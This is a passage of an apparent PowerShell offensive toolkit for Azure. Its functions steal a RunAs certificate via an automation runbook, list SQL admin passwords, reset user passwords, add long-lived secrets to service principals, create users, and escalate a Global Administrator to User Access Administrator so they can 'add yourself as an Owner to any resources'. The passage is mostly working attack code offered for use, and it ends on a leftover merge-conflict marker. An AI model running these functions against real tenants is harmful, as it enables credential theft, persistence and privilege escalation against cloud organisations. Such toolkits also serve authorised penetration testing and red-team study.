	Import-AzAutomationRunbook -Path .\AutomationTutorialPowerShell.ps1 -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Type PowerShell | Out-Null
	Write-Host "Publishing Runbook..." -ForegroundColor Green
	Publish-AzAutomationRunbook -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Name AutomationTutorialPowerShell| Out-Null
	Write-Host "Starting Runbook..." -ForegroundColor Green
	$start = Start-AzAutomationRunbook -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Name AutomationTutorialPowerShell	
	$jobid = $start.JobId
	Start-Sleep -s 10
	$record = Get-AzAutomationJobOutput -ResourceGroupName $ResourceGroup -AutomationAccountName $AutomationAccount -Id $jobid -Stream Any | Get-AzAutomationJobOutputRecord
	$Timeout = 120
	$timer = [Diagnostics.Stopwatch]::StartNew()
	While (!$record -and ($timer.Elapsed.TotalSeconds -lt $Timeout))
	{
	Write-Host "Waiting for Runbook Output..." -ForegroundColor Yellow
	Start-Sleep -s 10
	$record = Get-AzAutomationJobOutput -ResourceGroupName $ResourceGroup -AutomationAccountName $AutomationAccount -Id $jobid -Stream Any | Get-AzAutomationJobOutputRecord
	}
	$timer.Stop()	
    $thumbprint = $record.Value.Thumbprint
	$tenant = $CurrentUser.Tenant.Id
	$appID = $AppData.ApplicationId
	$b64 = $record.Value.value
	New-item AzureRunAsCertificate.pfx -Force | Out-Null
	$Password = "YourStrongPasswordForTheCert"
	$SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
	$d = pwd
	$CertPath = $d.Path + "\AzureRunAsCertificate.pfx"
	[IO.File]::WriteAllBytes($CertPath, [Convert]::FromBase64String($b64))
	Write-Host "Importing Certificate" -ForegroundColor Green
	$import = Import-PfxCertificate -FilePath $CertPath -CertStoreLocation Cert:\LocalMachine\My -Password $SecurePassword -Exportable
	Write-Host "Done! To login as the service principal, copy+paste the following command: " -ForegroundColor Green
	Write-Host ""
	Write-Host "Connect-AzAccount -CertificateThumbprint "$thumbprint" -ApplicationId "$appID" -Tenant "$tenant"" -ForegroundColor Green
	Remove-AzAutomationRunbook -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Name AutomationTutorialPowerShell -Force
	rm AutomationTutorialPowerShell.ps1
}

function Get-AzureSQLDB
{
<#
.SYNOPSIS 
Lists the available SQL Databases on a server

.PARAMETERES

-All
-Server

.EXAMPLE

Get-AzureSQLDB -All
Get-AzureSQLDB -Server 'SQLServer01'

#>
	[CmdletBinding()]
	Param(
	[Parameter(Mandatory=$false)][String]$ServerName = $null,
	[Parameter(Mandatory=$false)][Switch]$All = $null)
	If($All)
    {
	    $Servers = Get-AzSqlServer	
	    ForEach($Server in $Servers)
	    {
        $obj = New-Object -TypeName psobject		 	
	    $obj | Add-Member -MemberType NoteProperty -Name ServerName -Value $Server.ServerName
        $obj | Add-Member -MemberType NoteProperty -Name ServerAdmin -Value $Server.SqlAdministratorLogin
        $obj | Add-Member -MemberType NoteProperty -Name AdminPassword -Value $Server.SqlPassword
        $obj | Add-Member -MemberType NoteProperty -Name FQDN -Value $Server.FullyQualifiedDomainName
	    $db = $Server | Get-AzSqlDatabase
        $obj | Add-Member -MemberType NoteProperty -Name Databases -Value $db.DatabaseName
        $obj
	    }
    }
    If($ServerName)
    {
        $data = Get-AzSqlServer -ServerName $ServerName	 
        $obj = New-Object -TypeName psobject		 	
        $obj | Add-Member -MemberType NoteProperty -Name ServerName -Value $data.ServerName
        $obj | Add-Member -MemberType NoteProperty -Name ServerAdmin -Value $data.SqlAdministratorLogin
        $obj | Add-Member -MemberType NoteProperty -Name AdminPassword -Value $data.SqlPassword
        $obj | Add-Member -MemberType NoteProperty -Name FQDN -Value $data.FullyQualifiedDomainName
        $db = $data| Get-AzSqlDatabase
        $obj | Add-Member -MemberType NoteProperty -Name Databases -Value $db.DatabaseName
        $obj
    }
    If(!$All -and !$ServerName)
    {
        Write-Host "Usage:" -ForegroundColor Red
        Write-Host "Get-AzureSQLDB -All" -ForegroundColor Red
        Write-Host "Get-AzureSQLDB -Server 'SQLServer01'" -ForegroundColor Red
    }
}

function Set-AzureUserPassword
{
<#
.SYNOPSIS 
Sets a user's password
	
.PARAMETER
Password - New password for user
Username - Name of user   

.EXAMPLE

Set-AzureUserPassword -Username john@contoso.com -Password newpassw0rd1
#>
	[CmdletBinding()]
	 Param(
	[Parameter(Mandatory=$True)][String]$Password = $null,
	[Parameter(Mandatory=$True)][String]$Username = $null)

    $SecurePassword =  ConvertTo-SecureString $Password -AsPlainText -Force
	$Set = Update-AzADUser -UserPrincipalName $Username -Password $SecurePassword
	If($Set)
	{
	Write-Host "Successfully set $Username password to $Password"
	}
}

function Get-AzureRunAsAccounts
{
<#
.SYNOPSIS 
Lists all RunAs accounts for all Automation Accounts

.EXAMPLE
Get-AzureRunAsAccounts
#>

    $obj = New-Object -TypeName psobject		 	
    $apps = Get-AzADApplication | Where-Object {$_.HomePage -Match 'automationAccounts'}
    $sps = Get-AzADApplication | Where-Object {$_.HomePage -Match 'automationAccounts'} | Get-AzADServicePrincipal
    $obj | Add-Member -MemberType NoteProperty -Name AppName -Value $apps.DisplayName
    $obj | Add-Member -MemberType NoteProperty -Name AppObjectId -Value $apps.ObjectId
    $obj | Add-Member -MemberType NoteProperty -Name ApplicationId -Value $apps.ApplicationId
    $obj | Add-Member -MemberType NoteProperty -Name ServicePrincipalName -Value $sps.DisplayName
    $obj | Add-Member -MemberType NoteProperty -Name ServicePrincipalId -Value $sps.Id
    $obj
}

function Get-AzureAppOwner
{
<#
.SYNOPSIS 
Returns all owners of all applications in AAD

.EXAMPLE
Get-AzureAppOwners
#>
    $Headers = Get-AzureGraphToken
	$Uri = 'https://graph.microsoft.com/beta/applications'
	$appdata = Invoke-RestMethod -Headers $Headers -Uri $Uri
	$apps = $appdata.value
	ForEach($app in $apps)
	{
		$id = $app.id
		$Owners = Invoke-RestMethod -Headers $Headers -Uri "https://graph.microsoft.com/beta/applications/$id/owners"
		If($Owners.value.userPrincipalName)
		{
            $obj = New-Object -TypeName psobject
            $obj | Add-Member -MemberType NoteProperty -Name AppName -Value $app.DisplayName
            $obj | Add-Member -MemberType NoteProperty -Name OwnerName -Value $Owners.value.userPrincipalName
            $obj
		}
	}
}

function Add-AzureSPSecret
{
<# 
.SYNOPSIS
    Adds a secret to a service principal

.PARAMETERS
    -ApplicationName (Name of Application the SP is tied to)
	-Password
	
.EXAMPLE
	Add-AzureSPSecret -ApplicationName "ApplicationName" -Password password123
#>
    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$true)][String]$ApplicationName = $null,
	[Parameter(Mandatory=$true)][String]$Password = $null)
	$startDate = Get-Date
    $endDate = $startDate.AddYears(3)  
    $SecurePassword =  ConvertTo-SecureString $Password -AsPlainText -Force
	$new = New-AzADAppCredential -DisplayName $ApplicationName -StartDate $startDate -EndDate $endDate -Password $SecurePassword
    $App = Get-AzADApplication -DisplayName $ApplicationName 
    $aid = $App.Applicationid
    $Context = Get-AzContext

	If($new)
	{
		Write-Host "Success! You can now login as the service principal using the following commands:" -ForegroundColor Green
		Write-Host ""
		Write-Host '$Credential = Get-Credential; Connect-AzAccount -Credential $Credential -Tenant '$Context.Tenant.Id' -ServicePrincipal' -ForegroundColor Yellow
		Write-Host ""
		Write-Host 'Be sure to use the Application ID as the username when prompted by Get-Credential. The application ID is: '$aid'' -ForegroundColor Red
	}
}

function New-AzureUser
{
<# 
.SYNOPSIS
    Creates a user in Azure Active Directory

.PARAMETERS
	-Username (test@test.com)
	-Password (Password1234)
	
.EXAMPLE
	New-AzureUser -Username 'test@test.com' -Password Password1234
#>
    [CmdletBinding()]
    Param(
	[Parameter(Mandatory=$true, HelpMessage='Enter the username with the domain')][String]$Username = $null,
	[Parameter(Mandatory=$true, HelpMessage='Enter a password for the user')][String]$Password = $null)

	If($Username -notmatch '@')
	{
	Write-Host "Please supply the domain name the user will be added under, e.g. test@test.com" -ForegroundColor Red
	}
	else
	{
        $SecurePassword =  ConvertTo-SecureString $Password -AsPlainText -Force
	    $make = New-AzADUser -UserPrincipalName $Username -Password $SecurePassword
	    If($make)
	    {
		    Write-Host "Success! Please login with:" -ForegroundColor Green
		    Write-Host "Connect-AzAccount $Username -p $Password" -ForegroundColor Yellow
	    }
    }	
}

function Set-ElevatedPrivileges
{
<# 
.SYNOPSIS
    Elevates the user's privileges from Global Administrator in AzureAD to include User Access Administrator in Azure RBAC.
	
.EXAMPLE
	Set-ElevatedPrivileges
#>
    $Headers = Get-AzureGraphToken 
	$req = Invoke-RestMethod -ContentType 'application/json' -Headers $Headers -Method Post -Uri https://management.azure.com/providers/Microsoft.Authorization/elevateAccess?api-version=2016-07-01 | ConvertTo-Json
	If($req -eq '""')
	{
		Write-Host "Success! Re-login for permissions to take effect. You can now add yourself as an Owner to any resources in Azure!" -ForegroundColor Green
	}
}
>>>>>>> Stashed changes
